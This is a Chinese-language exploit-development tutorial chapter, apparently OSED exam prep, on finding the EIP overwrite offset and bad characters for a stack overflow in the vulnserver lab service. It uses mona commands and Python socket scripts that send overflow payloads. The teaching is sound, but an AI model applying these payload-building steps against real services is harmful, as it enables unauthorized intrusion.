# Ch 8 — 壞字元分析與 offset 定位

> **目標**：把 Ch 7 的「`EIP` 被 `A` 蓋掉」精確化成兩個數字和一張表——**精確 offset**（payload 裡第幾個 byte 開始覆蓋 `EIP`）與**壞字元清單**（哪些 byte 在傳輸途中會被協定或函式動過手，不能出現在你的 shellcode 裡）。這兩樣是 Ch 9、Ch 10 組出完整 exploit 的必備材料。

> **環境**：Win10 x64 22H2 + WinDbg（2026）+ mona v3 + Python 3 + Kali。

## 為什麼需要精確定位，不能靠猜

Ch 7 只知道「送 5000 個 `A` 會讓 `EIP` 變成 `0x41414141`」。這個資訊不夠用——你不知道：

1. 這 5000 個 byte 裡，**究竟是第幾個 byte 開始**覆蓋到 `EIP`。如果用全 `A` 去猜，你只能說「大概在某個範圍」，沒辦法精確到「第 2003 個 byte」這種程度。
2. 就算 offset 算對了，你接下來要塞進去的真正 payload（跳板位址、shellcode）裡，如果出現某些特定 byte，協定或底層函式可能會把它當成終止符、特殊字元處理掉，導致你的 payload 在傳輸或複製過程中**面目全非**——exploit 看起來邏輯正確卻怎麼都打不中,通常就是壞字元在搞鬼。

這兩個問題都用「送一個可逆向辨識的資料模式，再去記憶體裡比對」的思路解決，差別只在比對的對象：offset 比對的是「EIP 裡出現的 4 bytes 對應原始資料的哪個位置」，壞字元比對的是「送出去的完整 byte 序列 vs 記憶體裡實際看到的 byte 序列，哪裡被改了」。

## 先建立直覺：為什麼不能用純 A 算 offset

如果 payload 全部都是 `A`，`EIP` 崩潰後變成 `0x41414141`——但這告訴你「有 4 個 A 蓋到了 EIP」，**完全沒告訴你是第幾個**。你可以用二分法去試（送 2000 個 A、2001 個、2002 個……挨個試直到剛好蓋滿 `EIP` 不多不少），但這很慢，而且 OSED 考場時間有限。

更聰明的做法：送一段**每 4 bytes 都獨一無二**的資料。這種資料叫 **cyclic pattern**（de Bruijn sequence 的變體，mona 叫它 `pattern_create`）。概念如下：

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...
└──┘└──┘└──┘└──┘
每個 4-byte 區塊都不同，整段 60000 bytes 之內不會重複
```

崩潰後 `EIP` 裡會剛好裝著某一個獨一無二的 4-byte 區塊，比方說 `0x39624138`（反過來讀是 `8Ab9`）。拿這個值去反查「這個區塊在整個 pattern 裡的第幾個位置」，就是精確 offset——完全不用猜，一次崩潰就算出答案。這和你在 Linux pwn 用 `cyclic`/`pattern_offset`（pwntools）算 offset 是同一套邏輯，mona 是 Windows side 的對應工具。

## 核心：用 mona 產生 pattern、送出、反查 offset

### 步驟 1：產生 cyclic pattern

在 WinDbg 命令列（已附掛到 vulnserver，先讓它停在某個斷點或任意可下指令的狀態）：

```
!py -3.9 C:\Tools\mona3\mona.py pattern_create 3000
```

mona 會印出一段 3000 bytes 的 cyclic pattern 字串（存在它的工作目錄下，通常是 `C:\mona3\logs\vulnserver\pattern.txt` 一類路徑，依 mona v3 的輸出而定），把這段字串貼進你的 exploit 腳本：

```python
#!/usr/bin/env python3
import socket

target_ip   = "192.168.x.x"
target_port = 9999

# 從 mona pattern_create 3000 的輸出貼過來（示例，長度需與實際輸出一致）
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2..."  # 實際應為完整 3000 bytes

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b"TRUN ." + pattern + b"\r\n")
s.recv(1024)
s.close()
```

### 步驟 2：送出，讓服務崩潰，記下 EIP

跑這支腳本，WinDbg 應該中斷在 access violation，`EIP` 會是 pattern 裡某個獨一無二的 4-byte 值，例如（未實測，理論預期，數值請以你的環境實跑結果為準）：

```
eip=396f4138
```

### 步驟 3：反查 offset

```
!py -3.9 C:\Tools\mona3\mona.py pattern_offset 396f4138
```

mona 會印出類似：

```
[+] Pattern 396f4138 (0x396f4138) found in cyclic pattern at position 2003
```

**這個 2003 就是精確 offset**：payload 的第 2003 個 byte 之後緊接著 4 bytes 會落在覆蓋 `EIP` 的位置。vulnserver TRUN 的 offset 廣為人知落在 2003 附近，但**以你自己環境 `!mona findmsp` 或 `pattern_offset` 跑出來的值為準**——不同版本、不同編譯選項都可能讓這個數字略有差異，背書式地沿用網路上的數字是 OSED 考場常見的失分點。

> mona 也有一個更全面的指令 `!mona findmsp -distance 3000`，會一次幫你找出 EIP offset、ESP 相對位置、是否有其他覆寫到的暫存器——比單純 `pattern_offset` 資訊更完整，實務上更常用這個。

### 步驟 4：驗證——把 EIP 位置換成已知值

算出 offset 之後**一定要驗證**，不能直接相信數字：

```python
offset = 2003
buf  = b"A" * offset
buf += b"BBBB"                 # 應該精確落在 EIP
buf += b"C" * (3000 - offset - 4)
```

重新送出，WinDbg 應該顯示：

```
eip=42424242
```

`0x42` 是 `B` 的 ASCII。看到 `EIP` 精確等於 `42424242`、前面沒有多也沒有少，offset 才算確認。如果 `EIP` 變成一半 `B` 一半別的字元，代表 offset 算錯或資料在傳輸中被動過手（提示你該去查壞字元了）。

## 核心：找壞字元（bad chars）

### 為什麼壞字元存在

你的 payload 要經過：**socket 傳輸 → 服務的協定解析（可能是字串函式如 `strcpy`/`strtok`）→ 複製進 stack buffer**。這條路徑上任何一層都可能把特定 byte 值當成「特殊訊號」處理，而不是當成單純資料：

- **`\x00`（null byte）**：C 的字串函式（`strcpy`、`strlen` 等）把它當成字串終止符。只要 payload 裡出現一個 `\x00`，後面的所有資料可能直接被當作不存在——你的 shellcode 後半段消失了。
- **`\x0a`（LF，換行）、`\x0d`（CR，歸位）**：很多網路協定用 CRLF（`\r\n`）當作一行指令的結束符。如果你的 payload 中間出現 `\x0d` 或 `\x0a`，協定解析層可能把它當成「這行指令到此結束」，後面的資料被切掉或導致解析狀態錯亂。
- 其他字元依協定而定：有些服務對 `\x25`（`%`，格式化字串相關）、`\x2f`/`\x5c`（`/`、`\`，路徑相關）敏感——沒有通用答案，必須針對每個目標實測。

### 核心：用 mona 產生完整 byte array、逐步排除

```
!py -3.9 C:\Tools\mona3\mona.py bytearray -b "\x00"
```

這會產生一個**除了你指定要排除的 byte（這裡先只排 `\x00`，因為它幾乎必然是壞字元）之外，包含全部 0x01–0xFF 的連續序列**，存成一個檔案（依 mona v3 輸出路徑），同時在記憶體裡建立一份「理論上應該長這樣」的對照版本供比對用。

把這個 byte array 塞進 offset 之後的位置送出去：

```python
offset = 2003
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10..."
    # 完整 bytearray 從 mona 輸出貼過來，略
)
buf  = b"A" * offset
buf += b"BBBB"
buf += badchars
```

送出後崩潰，在 WinDbg 裡找到 `ESP`（或你送出的 badchars 落在 stack 上的起始位址），dump 這段記憶體：

```
!py -3.9 C:\Tools\mona3\mona.py compare -f C:\mona3\logs\vulnserver\bytearray.bin -a <ESP的位址>
```

mona 的 `compare` 指令會自動比對「你送出去的理論版本」vs「記憶體裡實際內容」，印出第一個不一致的位置，並判斷這是**截斷**（后面全部消失，典型是遇到 null byte 或行終止符）還是**位移/變形**（某個 byte 被換成別的值，但後面的資料還存在只是整體往前/後挪了，典型是某個 byte 被解析層吃掉或轉換）。

### 排除後重新測試，直到乾淨

找到第一個壞字元（例如比對結果顯示 `\x0a` 之後資料全部消失或錯位），把它加進排除清單重新產生 bytearray：

```
!py -3.9 C:\Tools\mona3\mona.py bytearray -b "\x00\x0a"
```

重送、重比對。重複這個「送→崩潰→比對→排除→重產」的循環，直到整份 bytearray 在記憶體裡和理論版本**逐 byte 一致**——這時你手上的排除清單就是完整的壞字元清單，供 Ch 9、Ch 10 產生跳板位址與 shellcode 時排除使用。

### 失敗與邊界情況

- **第一輪比對顯示從 `\x00` 之後全部消失**：這是最常見的情況，`\x00` 幾乎永遠是壞字元（字串終止），但仍要實測確認——有些服務用固定長度的 `memcpy` 而非 `strcpy`，`\x00` 不一定造成截斷，不能省略這一步直接假設。
- **排除 `\x00` 後又在 `\x0d` 處斷掉，排除 `\x0d` 後又在 `\x0a` 處斷掉**：CRLF 常常是一對出現的壞字元，排除順序沒關係，但務必每排除一個就重測，不要一次猜多個就跳過驗證。
- **比對結果顯示資料「變形」而非「消失」**：某個 byte 被換成別的值但長度沒變——這種壞字元比截斷更隱蔽，容易被忽略。務必整份比對到底，不要看到前面乾淨就停下。

## 底層機制：ESP 附近的記憶體對照流程

```
你送出的 payload（socket 層）
  b"A"*2003 + b"BBBB" + bytearray(\x01\x02...\xff，排除已知壞字元)
        │
        ▼ strcpy 類函式複製進 stack buffer
┌─────────────────────────────────────────┐
│ stack 記憶體（崩潰瞬間，ESP 指向附近）      │
│ esp →  01 02 03 ?? 05 06 ...             │  ← ?? 處和理論值不符：這就是壞字元的痕跡
└─────────────────────────────────────────┘
        │
        ▼ mona compare：逐 byte diff
   理論版本 vs 記憶體實際內容 → 第一個不一致的 offset → 對應回 bytearray 裡是哪個 byte
```

## 對比取捨：二分法猜 offset vs cyclic pattern

| 做法 | 優點 | 缺點 |
|---|---|---|
| 二分法（送不同長度的全 A，逐步逼近） | 不需額外工具，概念簡單 | 慢，需要多次崩潰，精度受限於你試的間距 |
| cyclic pattern + mona `pattern_offset` | 一次崩潰就算出精確 offset，OSED 標準做法 | 需要 mona 正常運作（Ch 0 的環境依賴） |

## 踩雷集錦

1. **錯誤直覺：網路上說 TRUN 的 offset 是 2003，直接拿來用不用驗證。**
   正確理解：2003 是廣為人知的參考值，但 Windows 版本、服務編譯方式、甚至你送 payload 的方式（有沒有多送 `.` 或其他 prefix）都可能讓實際 offset 偏移幾個 byte。**一律以你環境 `!mona findmsp` 或 `pattern_offset` 的結果為準**,拿到數字後務必用 Step 4 的 `BBBB` 驗證法再確認一次。

2. **錯誤直覺：找壞字元只要測一次 `\x00` 就夠了。**
   正確理解：壞字元清單通常不只一個。排除 `\x00` 後要重新產生 bytearray、重新送、重新比對，可能還會撞到 `\x0a`、`\x0d`，甚至協定特有的字元。這是一個要跑到「完全乾淨」為止的迴圈，不是一次性檢查。

3. **錯誤直覺：壞字元一定是「讓程式崩潰的那個字元」。**
   正確理解：壞字元是「讓你的 payload 在傳輸/複製過程中失真」的字元，和「造成崩潰的字元」是兩件不同的事。崩潰是 offset 之後的 4 bytes（跳板位址）造成的,壞字元分析是確保 offset 之後,到你放 shellcode 的那一段資料能完整無損地抵達目的地。

4. **錯誤直覺：找到 EIP 覆寫 offset 之後，立刻可以開始塞 shellcode。**
   正確理解：壞字元清單要先確定，否則你塞進去的跳板位址或 shellcode 裡如果剛好含有壞字元（例如跳板位址的某個 byte 恰好是 `0x00`），整個 payload 會在傳輸中損毀而你毫無頭緒——這也是為什麼 Ch 9 選跳板位址時要排除壞字元。

5. **錯誤直覺：mona `compare` 顯示「一致」就代表完全沒有壞字元，可以收工。**
   正確理解：你比對的是**這一輪 bytearray 排除清單之後**的版本。如果你一開始就漏排了某個該排除的字元,`compare` 可能在那之前就已經斷掉而你沒注意到比對點的位置,務必看清楚 mona 回報的「第一個不一致位置」對應到 bytearray 裡的哪個 offset、是哪個 byte。

## 進階：再往深一層

- **`!mona findmsp` 的全面診斷**：這個指令不只找 EIP offset,還會掃整個 stack,標出哪些暫存器指向你送的 pattern 裡的哪個位置、距離 EIP 多遠——對於之後要在 ESP 附近找空間放 shellcode（Ch 19 空間限制）很有用,提前熟悉它的輸出格式。
- **協定層壞字元 vs 函式層壞字元**：有些壞字元是協定解析造成（如 CRLF）,有些是底層字串函式造成（如 null byte）。理論上你可以透過逆向服務（Part 4）精確知道哪層造成哪個限制,但 OSED 考場時間有限,黑箱實測（本章做法）通常比逆向更快拿到答案——兩者是互補而非取代關係。

## 重點整理

- 用 cyclic pattern（mona `pattern_create`）送出、崩潰後用 `pattern_offset`（或 `!mona findmsp`）反查 EIP 覆寫的精確 offset,比二分法猜測快且精確。
- 算出的 offset 務必用 `BBBB` 等已知值驗證,`EIP` 要精確等於該值才算確認。
- 壞字元因為協定（CRLF）或字串函式（null 終止）把特定 byte 當特殊訊號處理而存在,`\x00`/`\x0a`/`\x0d` 是最常見的三個。
- 找壞字元是一個「送 bytearray → 崩潰 → mona compare → 排除 → 重產」的迴圈,跑到記憶體裡的內容和理論版本逐 byte 一致為止。
- 所有 WinDbg 輸出與數值在本章都是「未實測,理論預期」,請在你自己的環境逐步驗證。

## 自我檢核

- [ ] 能解釋為什麼純 `A` 填充算不出精確 offset,cyclic pattern 怎麼解決這個問題
- [ ] 能說出算出 offset 之後,驗證步驟（換成 `BBBB`）在確認什麼
- [ ] 能分別舉出 `\x00`、`\x0a`、`\x0d` 之所以是壞字元的具體原因
- [ ] 能描述 mona `bytearray` + `compare` 這個找壞字元迴圈的完整步驟
- [ ] 能說出「造成崩潰的字元」和「壞字元」為什麼是兩個不同的概念

## 延伸閱讀

- **[Corelan — Exploit Writing Tutorial part 3: SEH](https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorials-part-3-seh/)** 與 **[part 1: Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)** — Peter Van Eeckhoutte
  - 讀哪裡：part 1 的 pattern_create/pattern_offset 段落與壞字元分析段落。
  - 學什麼：mona 這兩個核心功能的原始教學示範,本章流程直接對應。
  - 前提：已完成 Ch 7 的首次崩潰。

- **[corelan/mona（GitHub）](https://github.com/corelan/mona)**
  - 讀哪裡：README 裡 `pattern_create`、`pattern_offset`、`bytearray`、`compare`、`findmsp` 指令的參數說明。
  - 學什麼：mona v3 這幾個指令目前的確切語法與輸出格式,版本更新可能讓參數略有變動。
  - 前提：Ch 0 已裝好 mona v3。

- **[Connor McGarr — Exploit Development blog](https://connormcgarr.github.io/)** — Connor McGarr
  - 讀哪裡：搜尋站內 stack overflow 入門系列,留意壞字元分析段落的記憶體截圖示範。
  - 學什麼：另一個角度看壞字元在記憶體裡呈現的實際樣貌,補強本章的 ASCII 示意圖。
  - 前提：無。

- **本 repo [`windows_pwn` Ch 19 — stack buffer overflow](../windows_pwn/19-stack-overflow.md)**
  - 讀哪裡：stack frame 與 saved EIP 覆寫段落。
  - 學什麼：和本章的 offset 定位交叉對照,理解 offset 數字對應到 stack frame 的哪個邊界。
  - 前提：已讀 Ch 7。

offset 和壞字元都確定後,你手上有「精確填充長度」和「哪些 byte 不能用」。下一章要解決「覆寫 EIP 之後,跳到哪裡」的問題——找一個穩定、不含壞字元的位址把執行流導向你放 shellcode 的地方。

→ [Ch 9 找 jump point（jmp esp）與模組選擇](./09-finding-jump-point.md)
